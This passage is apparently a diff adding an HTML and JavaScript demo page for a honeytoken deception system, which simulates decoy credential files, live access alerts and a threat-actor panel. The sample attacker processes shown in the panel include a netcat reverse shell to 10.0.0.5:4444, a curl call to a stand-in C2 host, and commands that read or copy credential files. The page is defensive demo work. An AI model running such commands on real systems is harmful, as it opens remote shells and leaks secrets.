@@ -1,0 +1,925 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Deception-Based Security System</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg:        #0f1117;
+    --bg2:       #161b22;
+    --bg3:       #21262d;
+    --border:    #30363d;
+    --text:      #c9d1d9;
+    --muted:     #8b949e;
+    --green:     #40c463;
+    --blue:      #58a6ff;
+    --red:       #f85149;
+    --yellow:    #e3b341;
+    --purple:    #bc8cff;
+    --font-mono: 'JetBrains Mono', monospace;
+    --font-sans: 'Inter', sans-serif;
+  }
+
+  html { scroll-behavior: smooth; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font-sans);
+    font-size: 15px;
+    line-height: 1.6;
+    min-height: 100vh;
+  }
+
+  /* NAV */
+  nav {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 0 2rem;
+    height: 56px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+  nav .logo {
+    font-family: var(--font-mono);
+    font-size: 1rem;
+    font-weight: 700;
+    color: var(--red);
+    text-decoration: none;
+  }
+  nav .back-link {
+    font-family: var(--font-mono);
+    font-size: 0.8rem;
+    color: var(--muted);
+    text-decoration: none;
+    border: 1px solid var(--border);
+    padding: 0.3rem 0.8rem;
+    border-radius: 6px;
+    transition: all 0.2s;
+  }
+  nav .back-link:hover { color: var(--blue); border-color: var(--blue); }
+
+  .container { max-width: 1100px; margin: 0 auto; padding: 2rem 1.5rem; }
+
+  /* DISCLAIMER */
+  .disclaimer {
+    background: rgba(227,179,65,0.1);
+    border: 1px solid var(--yellow);
+    border-radius: 8px;
+    padding: 0.75rem 1.25rem;
+    margin-bottom: 2rem;
+    font-family: var(--font-mono);
+    font-size: 0.78rem;
+    color: var(--yellow);
+  }
+
+  /* HERO */
+  .hero { margin-bottom: 2.5rem; }
+  .hero h1 { font-size: 2.2rem; font-weight: 700; margin-bottom: 0.4rem; }
+  .hero h1 span { color: var(--red); }
+  .hero p { color: var(--muted); font-size: 0.95rem; max-width: 620px; }
+
+  /* STATS STRIP */
+  .stats-strip {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 1rem;
+    margin-bottom: 2rem;
+  }
+  @media (max-width: 680px) { .stats-strip { grid-template-columns: repeat(2, 1fr); } }
+  .stat-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1.1rem 1.2rem;
+    text-align: center;
+  }
+  .stat-card .val {
+    font-family: var(--font-mono);
+    font-size: 1.9rem;
+    font-weight: 700;
+    line-height: 1;
+    margin-bottom: 0.25rem;
+  }
+  .stat-card .lbl { font-size: 0.75rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.06em; }
+  .c-red .val { color: var(--red); }
+  .c-yellow .val { color: var(--yellow); }
+  .c-green .val { color: var(--green); }
+  .c-blue .val { color: var(--blue); }
+
+  /* PANEL */
+  .panel {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    overflow: hidden;
+    margin-bottom: 1.5rem;
+  }
+  .panel-hdr {
+    background: var(--bg3);
+    padding: 0.7rem 1.25rem;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    font-family: var(--font-mono);
+    font-size: 0.82rem;
+    color: var(--muted);
+  }
+  .panel-hdr .dots { display: flex; gap: 6px; }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dot-r { background: var(--red); }
+  .dot-y { background: var(--yellow); }
+  .dot-g { background: var(--green); }
+  .panel-body { padding: 1.4rem; }
+
+  /* TERMINAL */
+  .terminal {
+    background: #0a0d12;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+    font-family: var(--font-mono);
+    font-size: 0.79rem;
+    line-height: 1.75;
+    min-height: 160px;
+    max-height: 260px;
+    overflow-y: auto;
+  }
+  .t-green { color: var(--green); }
+  .t-red   { color: var(--red); }
+  .t-yellow{ color: var(--yellow); }
+  .t-blue  { color: var(--blue); }
+  .t-dim   { color: var(--muted); }
+  .cursor {
+    display: inline-block;
+    width: 7px; height: 13px;
+    background: var(--green);
+    vertical-align: text-bottom;
+    animation: blink 1s step-end infinite;
+  }
+  @keyframes blink { 50% { opacity: 0; } }
+
+  /* BUTTONS */
+  .btn-deploy {
+    background: var(--red);
+    color: #fff;
+    border: none;
+    padding: 0.55rem 1.5rem;
+    border-radius: 6px;
+    font-family: var(--font-mono);
+    font-size: 0.85rem;
+    font-weight: 700;
+    cursor: pointer;
+    transition: opacity 0.2s;
+  }
+  .btn-deploy:hover { opacity: 0.85; }
+  .btn-deploy:disabled { opacity: 0.45; cursor: not-allowed; }
+  .btn-sm {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 0.35rem 0.9rem;
+    border-radius: 6px;
+    font-family: var(--font-mono);
+    font-size: 0.78rem;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .btn-sm:hover { border-color: var(--blue); color: var(--blue); }
+
+  /* TABLES */
+  .section-ttl {
+    font-size: 0.95rem;
+    font-weight: 600;
+    margin-bottom: 0.7rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    color: var(--text);
+  }
+  .section-ttl::before { content: '//'; font-family: var(--font-mono); color: var(--muted); font-size: 0.8rem; }
+  .tbl-wrap { overflow-x: auto; }
+  table { width: 100%; border-collapse: collapse; font-size: 0.83rem; }
+  thead th {
+    background: var(--bg3);
+    color: var(--muted);
+    font-family: var(--font-mono);
+    font-size: 0.73rem;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    padding: 0.5rem 0.85rem;
+    text-align: left;
+    border-bottom: 1px solid var(--border);
+  }
+  tbody td {
+    padding: 0.5rem 0.85rem;
+    border-bottom: 1px solid var(--border);
+    font-family: var(--font-mono);
+    font-size: 0.8rem;
+  }
+  tbody tr:hover { background: rgba(88,166,255,0.04); }
+
+  .badge {
+    display: inline-block;
+    padding: 2px 7px;
+    border-radius: 4px;
+    font-family: var(--font-mono);
+    font-size: 0.7rem;
+    font-weight: 700;
+    letter-spacing: 0.04em;
+  }
+  .b-critical { background: rgba(248,81,73,0.2);  color: var(--red);    border: 1px solid rgba(248,81,73,0.45); }
+  .b-high     { background: rgba(248,81,73,0.1);  color: #ff9a94;       border: 1px solid rgba(248,81,73,0.3); }
+  .b-medium   { background: rgba(227,179,65,0.15);color: var(--yellow); border: 1px solid rgba(227,179,65,0.4); }
+  .b-low      { background: rgba(88,166,255,0.1); color: var(--blue);   border: 1px solid rgba(88,166,255,0.3); }
+  .b-active   { background: rgba(64,196,99,0.15); color: var(--green);  border: 1px solid rgba(64,196,99,0.4); }
+  .b-triggered{ background: rgba(248,81,73,0.15); color: var(--red);    border: 1px solid rgba(248,81,73,0.4); }
+  .b-cred     { background: rgba(188,140,255,0.1);color: var(--purple); border: 1px solid rgba(188,140,255,0.3); }
+  .b-key      { background: rgba(227,179,65,0.1); color: var(--yellow); border: 1px solid rgba(227,179,65,0.3); }
+  .b-cfg      { background: rgba(88,166,255,0.1); color: var(--blue);   border: 1px solid rgba(88,166,255,0.3); }
+
+  /* TWO-COLUMN GRID */
+  .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 700px) { .two-col { grid-template-columns: 1fr; } }
+
+  /* ALERT FEED */
+  #alert-feed { max-height: 320px; overflow-y: auto; }
+  .alert-row {
+    display: flex;
+    align-items: flex-start;
+    gap: 0.75rem;
+    padding: 0.6rem 0;
+    border-bottom: 1px solid var(--border);
+    font-family: var(--font-mono);
+    font-size: 0.78rem;
+    animation: fadeIn 0.4s ease;
+  }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(-6px); } to { opacity: 1; transform: none; } }
+  .alert-row:last-child { border-bottom: none; }
+  .alert-time { color: var(--muted); min-width: 80px; }
+  .alert-msg  { flex: 1; color: var(--text); }
+  .alert-ip   { color: var(--muted); }
+
+  /* THREAT ACTOR */
+  .threat-card {
+    background: rgba(248,81,73,0.05);
+    border: 1px solid rgba(248,81,73,0.2);
+    border-radius: 8px;
+    padding: 1rem;
+    font-family: var(--font-mono);
+    font-size: 0.8rem;
+  }
+  .threat-row { display: flex; justify-content: space-between; margin-bottom: 0.4rem; }
+  .threat-key { color: var(--muted); }
+  .threat-val { color: var(--text); }
+  .risk-score-bar { margin-top: 0.7rem; }
+  .risk-score-bar .label { font-size: 0.72rem; color: var(--muted); margin-bottom: 4px; display: flex; justify-content: space-between; }
+  .risk-track { background: var(--bg3); height: 6px; border-radius: 3px; overflow: hidden; }
+  .risk-fill  { height: 100%; border-radius: 3px; background: linear-gradient(to right, var(--yellow), var(--red)); transition: width 1.2s ease; width: 0; }
+
+  /* TIMELINE CHART */
+  .timeline-chart {
+    display: flex;
+    align-items: flex-end;
+    gap: 3px;
+    height: 60px;
+    padding: 0 0.5rem;
+  }
+  .tl-bar {
+    flex: 1;
+    background: var(--bg3);
+    border-radius: 2px 2px 0 0;
+    min-height: 4px;
+    transition: height 0.5s ease, background 0.3s;
+    cursor: default;
+    position: relative;
+  }
+  .tl-bar.active { background: var(--red); }
+  .tl-bar.spike  { background: var(--yellow); }
+  .tl-labels { display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.65rem; color: var(--muted); padding: 3px 0.5rem 0; }
+
+  /* WEBHOOK SECTION */
+  .webhook-row { display: flex; gap: 0.75rem; align-items: flex-end; }
+  .webhook-row input {
+    flex: 1;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 0.5rem 0.85rem;
+    border-radius: 6px;
+    font-family: var(--font-mono);
+    font-size: 0.82rem;
+    outline: none;
+  }
+  .webhook-row input:focus { border-color: var(--blue); }
+
+  /* HOW IT WORKS */
+  .how-section { margin-top: 4rem; }
+  .how-section h2 { font-size: 1.5rem; font-weight: 700; margin-bottom: 0.35rem; }
+  .how-section h2 span { color: var(--red); }
+  .how-section .sub { color: var(--muted); font-size: 0.9rem; margin-bottom: 2rem; }
+  .feat-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem; }
+  @media (max-width: 680px) { .feat-grid { grid-template-columns: 1fr; } }
+  .feat-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1.2rem;
+    transition: border-color 0.2s;
+  }
+  .feat-card:hover { border-color: var(--red); }
+  .feat-icon { font-size: 1.4rem; margin-bottom: 0.5rem; }
+  .feat-card h4 { font-size: 0.88rem; font-weight: 600; color: var(--text); margin-bottom: 0.3rem; }
+  .feat-card p  { font-size: 0.78rem; color: var(--muted); line-height: 1.5; }
+
+  /* FOOTER */
+  footer {
+    margin-top: 5rem;
+    padding: 2rem 1.5rem;
+    border-top: 1px solid var(--border);
+    text-align: center;
+    font-family: var(--font-mono);
+    font-size: 0.78rem;
+    color: var(--muted);
+  }
+  footer a { color: var(--blue); text-decoration: none; }
+  footer a:hover { text-decoration: underline; }
+
+  .pulse {
+    display: inline-block;
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--green);
+    animation: pulse 2s ease-in-out infinite;
+    margin-right: 6px;
+  }
+  @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.4;transform:scale(1.3)} }
+
+  label {
+    display: block;
+    font-family: var(--font-mono);
+    font-size: 0.73rem;
+    color: var(--muted);
+    margin-bottom: 0.35rem;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <a href="https://tools.jasstej.tech" class="logo">[ deception-defense ]</a>
+  <a href="https://tools.jasstej.tech" class="back-link">← tools.jasstej.tech</a>
+</nav>
+
+<div class="container">
+
+  <!-- DISCLAIMER -->
+  <div class="disclaimer">
+    ⚠ AUTHORIZED USE ONLY — Deploy honeypots only on systems you own or have explicit written authorization to monitor. Unauthorized monitoring may violate privacy laws.
+  </div>
+
+  <!-- HERO -->
+  <div class="hero">
+    <h1>Deception-Based <span>Security System</span></h1>
+    <p>Deploy fake credential files and private keys as honeytokens. Catch attackers the moment they touch your bait — with real-time alerts, process identification, and webhook delivery.</p>
+  </div>
+
+  <!-- STATS STRIP -->
+  <div class="stats-strip">
+    <div class="stat-card c-red">
+      <div class="val" id="stat-alerts">0</div>
+      <div class="lbl">Total Alerts</div>
+    </div>
+    <div class="stat-card c-yellow">
+      <div class="val" id="stat-critical">0</div>
+      <div class="lbl">Critical Alerts</div>
+    </div>
+    <div class="stat-card c-green">
+      <div class="val" id="stat-decoys">0</div>
+      <div class="lbl">Active Decoys</div>
+    </div>
+    <div class="stat-card c-blue">
+      <div class="val" id="stat-last">—</div>
+      <div class="lbl">Last Triggered</div>
+    </div>
+  </div>
+
+  <!-- DEPLOY PANEL -->
+  <div class="panel">
+    <div class="panel-hdr">
+      <div class="dots">
+        <span class="dot dot-r"></span>
+        <span class="dot dot-y"></span>
+        <span class="dot dot-g"></span>
+      </div>
+      <span>deception_system.py — deployment console</span>
+      <span id="status-pill"></span>
+    </div>
+    <div class="panel-body">
+      <div style="display:flex;align-items:center;gap:1rem;margin-bottom:1rem;flex-wrap:wrap">
+        <button class="btn-deploy" id="deploy-btn" onclick="deployHoneypots()">Deploy Honeypots</button>
+        <button class="btn-sm" onclick="resetDashboard()">↺ Reset</button>
+        <span id="live-indicator" style="display:none;font-family:var(--font-mono);font-size:0.78rem;color:var(--green)">
+          <span class="pulse"></span>Monitoring active
+        </span>
+      </div>
+      <div class="terminal" id="deploy-terminal">
+        <div class="t-dim">// Deception-Based Security System — SOC demo</div>
+        <div class="t-dim">// Press "Deploy Honeypots" to initialize the honeypot grid.</div>
+        <div>&nbsp;</div>
+        <div><span class="t-green">$</span> <span class="cursor"></span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- HONEYPOT INVENTORY -->
+  <div class="section-ttl" id="inv-title" style="display:none">Honeypot Inventory</div>
+  <div class="panel" id="inventory-panel" style="display:none">
+    <div class="panel-hdr">
+      <span>Active decoy files</span>
+      <span id="inv-count" style="color:var(--green);font-family:var(--font-mono);font-size:0.8rem"></span>
+    </div>
+    <div class="panel-body" style="padding:0">
+      <div class="tbl-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Filename</th>
+              <th>Type</th>
+              <th>Location</th>
+              <th>Status</th>
+              <th>Triggers</th>
+            </tr>
+          </thead>
+          <tbody id="inv-tbody"></tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- LIVE ALERTS + THREAT ACTOR -->
+  <div class="two-col" id="live-section" style="display:none">
+
+    <!-- ALERT FEED -->
+    <div class="panel">
+      <div class="panel-hdr">
+        <span>Live Alert Feed</span>
+        <span id="feed-count" style="font-family:var(--font-mono);font-size:0.78rem;color:var(--red)">0 alerts</span>
+      </div>
+      <div class="panel-body" style="padding:0.75rem">
+        <div id="alert-feed">
+          <div class="t-dim" style="font-family:var(--font-mono);font-size:0.78rem;padding:0.5rem">Waiting for alerts...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- THREAT ACTOR -->
+    <div>
+      <div class="panel">
+        <div class="panel-hdr"><span>Threat Actor Profile</span></div>
+        <div class="panel-body">
+          <div class="threat-card" id="threat-card">
+            <div class="threat-row"><span class="threat-key">Source IP</span><span class="threat-val" id="t-ip">—</span></div>
+            <div class="threat-row"><span class="threat-key">User-Agent</span><span class="threat-val" id="t-ua" style="font-size:0.72rem">—</span></div>
+            <div class="threat-row"><span class="threat-key">Access Count</span><span class="threat-val" id="t-count">0</span></div>
+            <div class="threat-row"><span class="threat-key">Last Event</span><span class="threat-val" id="t-event">—</span></div>
+            <div class="risk-score-bar">
+              <div class="label"><span>Risk Score</span><span id="t-score">0</span></div>
+              <div class="risk-track"><div class="risk-fill" id="t-risk-fill"></div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- TIMELINE -->
+      <div class="panel" style="margin-top:1rem">
+        <div class="panel-hdr"><span>Alert Timeline (24h)</span></div>
+        <div class="panel-body" style="padding:1rem 0.75rem 0.5rem">
+          <div class="timeline-chart" id="timeline-chart"></div>
+          <div class="tl-labels">
+            <span>00:00</span><span>06:00</span><span>12:00</span><span>18:00</span><span>now</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /two-col -->
+
+  <!-- WEBHOOK CONFIG -->
+  <div class="panel" id="webhook-panel" style="display:none;margin-top:0.5rem">
+    <div class="panel-hdr"><span>Webhook Configuration</span></div>
+    <div class="panel-body">
+      <div class="webhook-row">
+        <div style="flex:1">
+          <label>Webhook URL</label>
+          <input type="text" id="webhook-url" placeholder="https://hooks.slack.com/services/..." value="">
+        </div>
+        <button class="btn-sm" onclick="testWebhook()" style="border-color:var(--green);color:var(--green)">Test Alert</button>
+      </div>
+      <div id="webhook-status" style="margin-top:0.6rem;font-family:var(--font-mono);font-size:0.75rem;color:var(--muted)"></div>
+    </div>
+  </div>
+
+  <!-- HOW IT WORKS -->
+  <div class="how-section">
+    <h2>How Active <span>Defense</span> Works</h2>
+    <p class="sub">Honeytokens turn attackers' own techniques against them — the moment they touch the bait, you know.</p>
+    <div class="feat-grid">
+      <div class="feat-card">
+        <div class="feat-icon">🍯</div>
+        <h4>Honeytoken Deployment</h4>
+        <p>Realistic-looking fake credentials — AWS keys, GitHub tokens, DB passwords — are placed where attackers expect to find real secrets.</p>
+      </div>
+      <div class="feat-card">
+        <div class="feat-icon">👁</div>
+        <h4>Real-Time File Monitoring</h4>
+        <p>Watchdog observes every filesystem event. Access, modification, deletion, or movement of a decoy file triggers an instant alert.</p>
+      </div>
+      <div class="feat-card">
+        <div class="feat-icon">🔍</div>
+        <h4>Process Identification</h4>
+        <p>psutil captures the PID, process name, username, and full command line of the process that touched the honeytoken.</p>
+      </div>
+      <div class="feat-card">
+        <div class="feat-icon">📡</div>
+        <h4>Webhook Integration</h4>
+        <p>Structured JSON alerts are POSTed to any HTTP endpoint — Slack, PagerDuty, SIEM, or your own incident response platform.</p>
+      </div>
+      <div class="feat-card">
+        <div class="feat-icon">🏗</div>
+        <h4>Honeypath Directories</h4>
+        <p>Decoys are deployed in backup/, scripts/, and private/ subdirectories to maximize the probability that a scanning attacker encounters them.</p>
+      </div>
+      <div class="feat-card">
+        <div class="feat-icon">📊</div>
+        <h4>Severity Classification</h4>
+        <p>Events are classified CRITICAL / HIGH / MEDIUM / LOW. Configure a minimum alert level to reduce noise while catching genuine threats.</p>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /container -->
+
+<footer>
+  <p>Deception-Based Security System — authorized deployment only</p>
+  <p style="margin-top:0.4rem"><a href="https://tools.jasstej.tech">← Back to tools.jasstej.tech</a></p>
+</footer>
+
+<script>
+// ── DECOY DATA ────────────────────────────────────────────────────────────────
+
+const DECOYS = [
+  { name: "passwords.txt",    type: "credential", location: "/opt/honeyfiles/" },
+  { name: "credentials.json", type: "credential", location: "/opt/honeyfiles/" },
+  { name: "aws_keys.txt",     type: "credential", location: "/opt/honeyfiles/" },
+  { name: ".env",             type: "credential", location: "/opt/honeyfiles/" },
+  { name: "id_rsa",           type: "private key",location: "/opt/honeyfiles/" },
+  { name: "config.ini",       type: "config",     location: "/opt/honeyfiles/" },
+  { name: "passwords.txt",    type: "credential", location: "/opt/honeyfiles/backup/" },
+  { name: "credentials.json", type: "credential", location: "/opt/honeyfiles/backup/" },
+  { name: "aws_keys.txt",     type: "credential", location: "/opt/honeyfiles/backup/" },
+  { name: ".env",             type: "credential", location: "/opt/honeyfiles/backup/" },
+  { name: "id_rsa",           type: "private key",location: "/opt/honeyfiles/backup/" },
+  { name: "config.ini",       type: "config",     location: "/opt/honeyfiles/backup/" },
+];
+
+const EVENT_TYPES = [
+  { type: "FILE_ACCESSED",  sev: "HIGH",     msg: "Credential file read" },
+  { type: "FILE_MODIFIED",  sev: "CRITICAL", msg: "Decoy file tampered" },
+  { type: "FILE_ACCESSED",  sev: "HIGH",     msg: "Private key accessed" },
+  { type: "FILE_ACCESSED",  sev: "HIGH",     msg: "Env file accessed" },
+  { type: "FILE_MOVED",     sev: "HIGH",     msg: "Decoy file moved" },
+  { type: "FILE_MODIFIED",  sev: "CRITICAL", msg: "Config file modified" },
+];
+
+const AGENTS = [
+  "python3 /tmp/harvest.py",
+  "curl -s http://c2.example.com",
+  "bash /tmp/.x",
+  "nc -e /bin/sh 10.0.0.5 4444",
+  "cat .env",
+  "cp credentials.json /tmp/.out",
+];
+
+// ── STATE ─────────────────────────────────────────────────────────────────────
+
+let deployed = false;
+let alertCount = 0;
+let criticalCount = 0;
+let alertInterval = null;
+let accessCount = 0;
+const decoyTriggers = {};
+const timelineBars = new Array(24).fill(0);
+let currentIP = null;
+
+// ── HELPERS ───────────────────────────────────────────────────────────────────
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+
+function randIP() {
+  return `192.168.${randInt(1,254)}.${randInt(1,254)}`;
+}
+
+function now() {
+  return new Date().toLocaleTimeString('en-US', { hour12: false });
+}
+
+function termLine(html) {
+  const t = document.getElementById('deploy-terminal');
+  const cursor = t.querySelector('.cursor');
+  if (cursor) cursor.closest('div').remove();
+  const div = document.createElement('div');
+  div.innerHTML = html;
+  t.appendChild(div);
+  const c = document.createElement('div');
+  c.innerHTML = '<span class="t-green">$</span> <span class="cursor"></span>';
+  t.appendChild(c);
+  t.scrollTop = t.scrollHeight;
+}
+
+// ── DEPLOY ANIMATION ──────────────────────────────────────────────────────────
+
+async function deployHoneypots() {
+  if (deployed) return;
+  const btn = document.getElementById('deploy-btn');
+  btn.disabled = true;
+  btn.textContent = '◌ Deploying...';
+
+  const t = document.getElementById('deploy-terminal');
+  t.innerHTML = '';
+
+  await sleep(80);
+  termLine(`<span class="t-green">$</span> python deception_system.py --deploy-dir /opt/honeyfiles`);
+  await sleep(400);
+  termLine(`<span class="t-blue">[*] Deception-Based Security System</span>`);
+  await sleep(300);
+  termLine(`<span class="t-dim">[*] Deploy dir  : /opt/honeyfiles</span>`);
+  termLine(`<span class="t-dim">[*] Alert level : LOW</span>`);
+  termLine(`<span class="t-dim">[*] Log file    : decoy_alerts.json</span>`);
+  await sleep(400);
+  termLine(`<span class="t-yellow">[!] Creating honeypath directories...</span>`);
+  await sleep(300);
+
+  for (const dir of ['backup', 'scripts', 'private']) {
+    await sleep(180);
+    termLine(`&nbsp; <span class="t-blue">[+] Created honeypath dir: /opt/honeyfiles/${dir}/</span>`);
+  }
+
+  await sleep(400);
+  termLine(`<span class="t-yellow">[!] Deploying decoy files...</span>`);
+  await sleep(200);
+
+  for (const d of DECOYS.slice(0, 6)) {
+    await sleep(120);
+    termLine(`&nbsp; <span class="t-green">[+] Deployed: /opt/honeyfiles/${d.name}</span>`);
+    decoyTriggers[d.location + d.name] = 0;
+  }
+  for (const d of DECOYS.slice(6)) {
+    await sleep(100);
+    termLine(`&nbsp; <span class="t-green">[+] Deployed: /opt/honeyfiles/backup/${d.name}</span>`);
+    decoyTriggers[d.location + d.name] = 0;
+  }
+
+  await sleep(500);
+  termLine(`<span class="t-green">[+] Registry saved: /opt/honeyfiles/.decoy_registry.json</span>`);
+  termLine(`<span class="t-green">[+] 12 decoy files deployed.</span>`);
+  await sleep(400);
+  termLine(`<span class="t-blue">[*] Starting filesystem monitor (watchdog)...</span>`);
+  await sleep(600);
+  termLine(`<span class="t-green">[*] Monitoring 12 decoys. Waiting for access events...</span>`);
+
+  deployed = true;
+  btn.textContent = 'Deployed';
+  document.getElementById('stat-decoys').textContent = '12';
+  document.getElementById('live-indicator').style.display = 'flex';
+
+  // Show panels
+  renderInventory();
+  document.getElementById('inv-title').style.display = 'flex';
+  document.getElementById('inventory-panel').style.display = 'block';
+  document.getElementById('live-section').style.display = 'grid';
+  document.getElementById('webhook-panel').style.display = 'block';
+
+  // Build timeline
+  buildTimeline();
+
+  // Start simulated alert stream
+  currentIP = randIP();
+  startAlertStream();
+}
+
+// ── INVENTORY TABLE ───────────────────────────────────────────────────────────
+
+function renderInventory() {
+  const tbody = document.getElementById('inv-tbody');
+  tbody.innerHTML = '';
+  document.getElementById('inv-count').textContent = `${DECOYS.length} files`;
+
+  for (const d of DECOYS) {
+    const key = d.location + d.name;
+    const triggers = decoyTriggers[key] || 0;
+    const typeBadge = d.type === 'credential'  ? 'b-cred'
+                    : d.type === 'private key' ? 'b-key'
+                    : 'b-cfg';
+    const typeLbl = d.type === 'credential'  ? 'Credential'
+                  : d.type === 'private key' ? 'Private Key'
+                  : 'Config';
+    const statusBadge = triggers > 0 ? 'b-triggered' : 'b-active';
+    const statusLbl   = triggers > 0 ? 'Triggered'   : 'Active';
+    const tr = document.createElement('tr');
+    tr.id = `decoy-${encodeURIComponent(key)}`;
+    tr.innerHTML = `
+      <td>${d.name}</td>
+      <td><span class="badge ${typeBadge}">${typeLbl}</span></td>
+      <td style="color:var(--muted);font-size:0.75rem">${d.location}</td>
+      <td><span class="badge ${statusBadge}" id="status-${encodeURIComponent(key)}">${statusLbl}</span></td>
+      <td id="tcount-${encodeURIComponent(key)}">${triggers}</td>`;
+    tbody.appendChild(tr);
+  }
+}
+
+// ── ALERT STREAM ──────────────────────────────────────────────────────────────
+
+function startAlertStream() {
+  let nextDelay = randInt(2500, 4500);
+
+  function scheduleNext() {
+    alertInterval = setTimeout(async () => {
+      emitAlert();
+      scheduleNext();
+    }, randInt(3000, 5000));
+  }
+
+  setTimeout(() => {
+    emitAlert();
+    scheduleNext();
+  }, nextDelay);
+}
+
+function emitAlert() {
+  const ev   = EVENT_TYPES[randInt(0, EVENT_TYPES.length - 1)];
+  const decoy = DECOYS[randInt(0, DECOYS.length - 1)];
+  const key   = decoy.location + decoy.name;
+  const ts    = now();
+
+  alertCount++;
+  if (ev.sev === 'CRITICAL') criticalCount++;
+  accessCount++;
+
+  // Update decoy triggers
+  decoyTriggers[key] = (decoyTriggers[key] || 0) + 1;
+  const encKey = encodeURIComponent(key);
+  const statusEl = document.getElementById(`status-${encKey}`);
+  const tcountEl = document.getElementById(`tcount-${encKey}`);
+  if (statusEl) {
+    statusEl.className = 'badge b-triggered';
+    statusEl.textContent = 'Triggered';
+  }
+  if (tcountEl) tcountEl.textContent = decoyTriggers[key];
+
+  // Update stats
+  document.getElementById('stat-alerts').textContent   = alertCount;
+  document.getElementById('stat-critical').textContent = criticalCount;
+  document.getElementById('stat-last').textContent     = ts;
+
+  // Add to feed
+  addAlertToFeed(ts, ev, decoy, currentIP);
+
+  // Update threat actor
+  updateThreatActor(ev);
+
+  // Update timeline
+  updateTimeline();
+}
+
+function addAlertToFeed(ts, ev, decoy, ip) {
+  const feed = document.getElementById('alert-feed');
+
+  // Clear "waiting" message
+  const waiting = feed.querySelector('.t-dim');
+  if (waiting) waiting.remove();
+
+  const badgeCls = ev.sev === 'CRITICAL' ? 'b-critical'
+                 : ev.sev === 'HIGH'     ? 'b-high'
+                 : ev.sev === 'MEDIUM'   ? 'b-medium'
+                 : 'b-low';
+
+  const row = document.createElement('div');
+  row.className = 'alert-row';
+  row.innerHTML = `
+    <span class="alert-time">${ts}</span>
+    <span class="badge ${badgeCls}">${ev.sev}</span>
+    <span class="alert-msg">${ev.msg} — <span style="color:var(--yellow)">${decoy.name}</span></span>
+    <span class="alert-ip">${ip}</span>`;
+  feed.prepend(row);
+
+  // Cap feed at 20 items
+  while (feed.children.length > 20) feed.removeChild(feed.lastChild);
+
+  document.getElementById('feed-count').textContent = `${alertCount} alerts`;
+}
+
+function updateThreatActor(ev) {
+  document.getElementById('t-ip').textContent    = currentIP;
+  document.getElementById('t-ua').textContent    = AGENTS[randInt(0, AGENTS.length - 1)];
+  document.getElementById('t-count').textContent = accessCount;
+  document.getElementById('t-event').textContent = ev.type;
+
+  const score = Math.min(100, Math.round(accessCount * 6 + (criticalCount * 15)));
+  document.getElementById('t-score').textContent = score;
+  setTimeout(() => {
+    document.getElementById('t-risk-fill').style.width = score + '%';
+  }, 50);
+}
+
+// ── TIMELINE ──────────────────────────────────────────────────────────────────
+
+function buildTimeline() {
+  const chart = document.getElementById('timeline-chart');
+  chart.innerHTML = '';
+  // Generate realistic 24h pattern — low overnight, spikes during work hours
+  for (let h = 0; h < 24; h++) {
+    const base = h >= 9 && h <= 17 ? randInt(8, 30)
+               : h >= 0 && h <= 5  ? randInt(1, 5)
+               : randInt(3, 15);
+    timelineBars[h] = base;
+    const bar = document.createElement('div');
+    bar.className = 'tl-bar' + (h === 23 ? ' active' : h >= 9 && h <= 17 ? ' spike' : '');
+    bar.style.height = Math.round(base * 1.8) + 'px';
+    bar.title = `${String(h).padStart(2,'0')}:00 — ${base} alerts`;
+    chart.appendChild(bar);
+  }
+}
+
+function updateTimeline() {
+  timelineBars[23]++;
+  const bars = document.querySelectorAll('.tl-bar');
+  if (bars[23]) bars[23].style.height = Math.min(60, Math.round(timelineBars[23] * 1.8)) + 'px';
+}
+
+// ── WEBHOOK ───────────────────────────────────────────────────────────────────
+
+function testWebhook() {
+  const url = document.getElementById('webhook-url').value.trim();
+  const statusEl = document.getElementById('webhook-status');
+  if (!url) {
+    statusEl.style.color = 'var(--red)';
